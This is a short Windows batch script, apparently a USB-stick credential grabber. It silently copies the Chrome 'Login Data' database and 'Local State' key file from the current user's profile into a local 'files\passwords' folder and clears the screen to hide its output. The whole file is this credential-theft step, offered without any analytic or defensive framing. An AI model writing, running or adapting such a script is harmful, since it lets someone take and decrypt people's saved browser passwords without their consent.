@echo off
cls 
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
copy "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "files\passwords"
copy "C:\Users\%username%\AppData\Local\Google\Chrome\User Data\Local State " "files\passwords"
cls